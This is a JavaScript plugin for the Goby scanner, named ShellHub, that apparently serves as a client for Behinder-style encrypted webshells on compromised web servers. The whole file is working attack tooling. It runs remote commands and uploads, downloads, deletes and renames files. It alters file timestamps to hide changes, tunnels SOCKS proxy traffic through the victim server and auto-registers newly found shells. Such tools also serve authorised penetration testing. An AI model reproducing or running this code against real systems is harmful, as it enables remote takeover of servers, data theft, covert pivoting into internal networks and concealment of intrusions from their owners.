function activate(content) {
    let cookiejar = require('./behinder/jar');
    let utils = require("./behinder/utils");
    let jar
    let config = goby.getConfiguration();

    class ShellsManagerX {
        constructor() {
            this.isDown = false;
            this.os = require('os');
            this.fs = require('fs');
            this.path = require('path');
            this.http = require('./behinder/req');
            this.GetData = require('./behinder/payload');
            this.cryptox = require("./behinder/crypto");

            this.crypt = require('crypto'); //引入crypto加密模块
            this.config = goby.getConfiguration();
            this.filePath = this.path.join(__dirname, '/info.json');

        }

        init(index) {
            jar = cookiejar.getJar(index)
            let info = this.shellsInfo();
            this.url = info[index].URL;
            this.proxy = info[index].Proxy;
            this.headers = info[index].Headers;
            this.pwd = this.crypt.createHash('md5').update(info[index].PWD).digest('hex').substr(0, 16);
            this.script = info[index].Script;
            this.encryptType = info[index].IsXor === true ? 1 : 0;
            console.log(this.encryptType)
        }

        getQueue() {
            delete require.cache[require.resolve(this.filePath)];
            return require(this.filePath);
        }

        cleanJar() {
            cookiejar.cleanJar()
        }

        // 修改更新 shell info 信息
        fixShellsInfo(fixjson) {
            return new Promise((resolve, reject) => {
                console.log(fixjson);
                let queue = this.getQueue();
                queue.info['shells'] = fixjson;
                this.fs.writeFile(this.filePath, JSON.stringify(queue, null, 6), (err, res) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(res);
                    }
                })
            })
        }

        // 读取json文件并返回到html页面中
        shellsInfo() {
            let data = this.fs.readFileSync(this.filePath, 'utf-8')
            let jsondata = JSON.parse(data);
            // console.log(jsondata.info.shells);
            return jsondata.info.shells;
        }

        echo(content, force) {
            let params = new Map();
            params.set("content", content);
            if (this.script === "jsp") {
                params.set("forcePrint", force);
            }
            let data = this.GetData(this.pwd, "EchoGo", params, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                let resObj = Buffer.from(res.body, 'hex');
                console.log(resObj)
                return this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
            })
            // let res = this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0)
            // let resObj = Buffer.from(res, 'hex');
            // console.log(resObj)
            // return this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
        }


        getBasicInfo(whatever, force) {
            let params = new Map();
            params.set("whatever", whatever);
            if (this.script === "jsp") {
                params.set("forcePrint", force);
            }
            let data = this.GetData(this.pwd, "BasicInfoGo", params, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                let resObj = Buffer.from(res.body, 'hex');
                let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                console.log(resMap)
                let resJson = JSON.parse(resMap)
                for (let k in resJson) {
                    if (k !== "basicInfo") {
                        resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
                    }
                }
                return resJson
            })

        }

        runCmd(cmd, path, force) {
            let params = new Map();
            params.set("cmd", cmd);
            params.set("path", path);
            if (this.script === "jsp") {
                params.set("forcePrint", force);
            }
            let data = this.GetData(this.pwd, "CmdGo", params, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                let resObj = Buffer.from(res.body, 'hex');
                let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                let resJson = JSON.parse(resMap)
                for (let k in resJson) {
                    resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
                }
                return resJson
            })
        }

        //
        operationFile(mode, path, force, params) {
            let operParams = this.fileSelectMode(mode, path, force, params)
            let data = this.GetData(this.pwd, "FileOperationGo", operParams, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                let resObj = Buffer.from(res.body, 'hex');
                let resMap
                if (mode === "download") {
                    try {
                        utils.ExportRaw(params["remote_path"].split('/').slice(-1), resObj)
                        return "success"
                    } catch (e) {
                        return e
                    }

                } else {
                    resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                    let resJson = JSON.parse(resMap)
                    for (let k in resJson) {
                        resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
                    }
                    console.log(resJson)
                    return resJson
                }
            })
        }

        uploadFile(remotePath, filePath, fileContent, force, useBlock, callback) {
            callback && callback(0)
            let params = new Map();
            params.set("mode", "create");
            params.set("path", remotePath);
            if (this.script === "jsp") {
                params.set("forcePrint", force);
            }
            if (!useBlock) {
                if (filePath.length > 0) {
                    fileContent = this.fs.readFileSync(filePath)
                }
                params.set("content", Buffer.from(fileContent).toString('base64'));
                let data = this.GetData(this.pwd, "FileOperationGo", params, this.script, this.encryptType)
                return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                    let resObj = Buffer.from(res.body, 'hex');
                    let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                    let resJson = JSON.parse(resMap)
                    for (let k in resJson) {
                        resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
                    }
                    console.log(resJson)
                    return resJson
                })
            } else {
                let blocks = utils.FileSplit(filePath, 46080)
                const CustomForeach = async (arr, callback) => {
                    const length = arr.length;
                    const O = Object(arr);
                    let k = 0;
                    let data;
                    while (k < length) {
                        if (!this.isDown) {
                            return null;
                        }
                        if (k in O) {
                            console.log('doing foreach...');
                            const kValue = O[k];
                            data = await callback(kValue, k, O);
                        }
                        if (!this.isDown) {
                            return null;
                        }
                        k++;
                    }
                    return data
                };
                return CustomForeach(blocks, (item, key, arr) => {
                    return new Promise((resolve, reject) => {
                        if (key === 0) {
                            params.set("mode", "create");
                        } else {
                            params.set("mode", "append");
                        }
                        params.set("path", remotePath);
                        params.set("content", Buffer.from(item).toString('base64'));
                        let data = this.GetData(this.pwd, "FileOperationGo", params, this.script, this.encryptType)
                        this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                            let resObj = Buffer.from(res.body, 'hex');
                            let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                            let resJson = JSON.parse(resMap)
                            for (let k in resJson) {
                                resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
                            }
                            console.log(resJson)
                            // return resJson
                            if (resJson.status === "success") {
                                if (key === blocks.length - 1) {
                                    console.log('success')
                                    console.log(resJson)
                                    resolve(resJson)
                                }
                                if (callback) {
                                    if (!this.isDown) {
                                        callback(null)
                                    } else {
                                        callback(Math.floor(((key + 1) / arr.length) * 100))
                                    }
                                }
                                resolve(resJson)
                            } else {
                                let err = new Error(resJson.msg)
                                console.log(err)
                                reject(err)
                            }
                        }).catch(e => {
                            console.log(e)
                            reject(e)
                        })
                    })
                })
            }
        }

        fileSelectMode(mode, path, force, operJson) {
            let pathStr = path.replace(new RegExp("\\\\", "gm"), "/")
            let oldFileName = operJson["old_file_name"]
            let newFileName = operJson["new_file_name"]
            let dirName = operJson["dir_name"]
            let remotePath = operJson["remote_path"]
            let charSet = operJson["char_set"]
            let createTimeStamp = operJson["create_time_stamp"]
            let modifyTimeStamp = operJson["modify_time_stamp"]
            let accessTimeStamp = operJson["access_time_stamp"]
            let isChunk = operJson["is_chunk"]
            if (pathStr.charAt(pathStr.length - 1) !== "/" && mode !== "delete") {
                pathStr = pathStr + "/"
            }

            let params = new Map();
            if (this.script === "jsp") {
                params.set("forcePrint", force);
            }
            switch (mode) {
                // 列表文件树
                case "list":
                    params.set("mode", mode)
                    params.set("path", pathStr)
                    break
                //	打开文件
                case "show":
                    params.set("mode", mode)
                    params.set("path", pathStr + oldFileName);
                    if (this.script === "php") {
                        params.set("content", "");
                    }
                    if (charSet !== "") {
                        params.set("charset", charSet)
                    }
                    break
                //	删除文件或文件夹
                case "delete":
                    params.set("mode", mode)
                    params.set("path", pathStr)
                    break
                //	文件上传
                case "create":
                    if (!isChunk) {
                        params.set("mode", mode)
                        params.set("path", remotePath)
                        params.set("content", "11111")
                    } else {

                    }
                    break
                //	追加文件
                case "append":
                    params.set("mode", mode)
                    params.set("path", remotePath)
                    params.set("content", "11111")
                    break
                //	文件下载
                case "download":
                    params.set("mode", mode)
                    params.set("path", remotePath)
                    break
                //	重命名
                case "rename":
                    params.set("mode", mode)
                    params.set("path", oldFileName)
                    params.set("newPath", newFileName)
                    if (this.script === "php") {
                        params["content"] = ""
                        params["charset"] = ""
                    }
                    break
                //	创建文件
                case "createFile":
                    params.set("mode", mode)
                    params.set("path", newFileName)
                    break
                //	创建文件夹
                case "createDirectory":
                    params.set("mode", mode)
                    params.set("path", pathStr + dirName)
                    break
                //	获取时间戳
                case "getTimeStamp":
                    params.set("mode", mode)
                    params.set("path", pathStr + oldFileName)
                    break
                //	更新时间戳
                case "updateTimeStamp":
                    params.set("mode", mode)
                    params.set("path", pathStr + oldFileName)
                    params.set("createTimeStamp", createTimeStamp)
                    params.set("modifyTimeStamp", modifyTimeStamp)
                    params.set("accessTimeStamp", accessTimeStamp)
                    break
            }
            return params
        }

        readProxyData(socketHash) {
            let params = new Map();
            params.set("cmd", "READ");
            if (this.script === "php") {
                params.set("remoteIP", "");
                params.set("remotePort", "");
            }
            params.set("socketHash", socketHash);
            let data = this.GetData(this.pwd, "SocksProxyGo", params, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                // let resObj = Buffer.from(res.body, 'hex');
                // let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                // let resJson = JSON.parse(resMap)
                // for (let k in resJson) {
                //     resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
                // }
                // console.log(resJson)
                // return resJson
                let resData
                if (res.statusCode === 200) {
                    resData = Buffer.from(res.body, 'hex')
                    if (resData != null && resData.length >= 4 && resData[0] === 55 && resData[1] === 33 && resData[2] === 73 && resData[3] === 54) {
                        resData = null;
                    } else {
                        let resDataB
                        if (res.headers.server.length !== 0 && res.headers.server.indexOf("Apache-Coyote/1.1") > 0) {
                            resDataB = resData.slice(0, resData.length - 1);
                        }

                        if (resDataB == null) {
                            resData = null;
                        }
                    }
                } else {
                    resData = null
                }
                return resData
            })

        }

        writeProxyData(proxyData, socketHash) {
            let params = new Map();
            params.set("cmd", "FORWARD");
            params.set("targetIP", "");
            params.set("targetPort", "");
            params.set("socketHash", socketHash);
            params.set("extraData", Buffer.from(proxyData).toString('base64'));
            let data = this.GetData(this.pwd, "SocksProxyGo", params, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                let resData
                if (res.statusCode === 200) {
                    resData = Buffer.from(res.body, 'hex')
                    if (resData != null && resData.length >= 4 && resData[0] === 55 && resData[1] === 33 && resData[2] === 73 && resData[3] === 54) {
                        resData = resData.slice(4, resData.length)
                        return false
                    } else {
                        return true
                    }
                } else {
                    return false
                }
            })

        }

        closeProxy(socketHash){
            let params = new Map();
            params.set("cmd", "DISCONNECT");
            params.set("socketHash", socketHash);
            let data = this.GetData(this.pwd, "SocksProxyGo", params, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                return res.statusCode === 200;
            })

        }
        openProxy(destHost,destPort,socketHash){
            let params = new Map();
            params.set("cmd", "CONNECT");
            params.set("targetIP", destHost);
            params.set("targetPort", destPort);
            params.set("socketHash", socketHash);
            let data = this.GetData(this.pwd, "SocksProxyGo", params, this.script, this.encryptType)
            let resData
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                resData = Buffer.from(res.body, 'hex')
                if (res.statusCode === 200) {
                    resData = Buffer.from(res.body, 'hex')
                    if (resData != null && resData.length >= 4 && resData[0] === 55 && resData[1] === 33 && resData[2] === 73 && resData[3] === 54) {
                        resData = resData.slice(4, resData.length)
                        return false
                    } else {
                        return true
                    }
                } else {
                    return false
                }
            })

        }
    }

    if (!window.ShellsManagerX) {
        window.ShellsManagerX = new ShellsManagerX();
    }
    goby.bindEvent('onWebShell', (res) => {
        let shellInfo = window.ShellsManagerX.shellsInfo()
        console.log(shellInfo);
        let urlParse = require('url');
        if (shellInfo.length === 0) {
            let script = urlParse.parse(res.url).pathname.split('.').slice(-1)[0]
            shellInfo.push({
                "ID": shellInfo.length + 1,
                "URL": res.url,
                "OS": "",
                "CPath": "",
                "DList": "",
                "PWD": res.pwd,
                "Script": script,
                "Proxy": config.Proxy.default,
                "IsXor": false,
                "Headers": {},
                "Time": Date.now(),
                "Status": "Null"
            })
        } else {
            let urlList = []
            shellInfo.forEach(element => {
                urlList.push(element.URL)
            });
            console.log(urlList);
            if (urlList.indexOf(res.url) === -1) {
                let script = urlParse.parse(res.url).pathname.split('.').slice(-1)[0]
                shellInfo.push({
                    "ID": shellInfo.length + 1,
                    "URL": res.url,
                    "OS": "",
                    "CPath": "",
                    "DList": "",
                    "PWD": res.pwd,
                    "Script": script,
                    "Proxy": config.Proxy.default,
                    "IsXor": false,
                    "Headers": {},
                    "Time": Date.now(),
                    "Status": "Null"
                })
            }
        }
        let randStr = utils.randomRange(30, 200)
        console.log(this.url)
        window.ShellsManagerX.fixShellsInfo(shellInfo).then(res => {
            window.ShellsManagerX.init(shellInfo.length - 1)
            window.ShellsManagerX.echo(randStr, "false").then(res => {
                console.log(res)
                if (res === undefined || res.indexOf("Error") !== -1) {
                    goby.showErrorMessage("ShellHub : Shell Connection failed!")
                    res = ""
                }
                if (res.indexOf("status") !== -1) {
                    let path = require('path');
                    goby.showIframeDia(path.join(__dirname, '/auto_manager.html'), "ShellHub", "980", "500");
                } else {
                    alert("shell 连接失败！")
                    goby.showErrorMessage("ShellHub : Shell Connection failed!")
                }

            }).catch((error) => {
                goby.showErrorMessage("ShellHub :" + error.message)
            })
        })


    })
    goby.registerCommand('ShellsManager', function (content) {
        let path = require('path');

        goby.showIframeDia(path.join(__dirname, '/user_manager.html'), "ShellHub", "980", "500");

    });
}

exports.activate = activate;
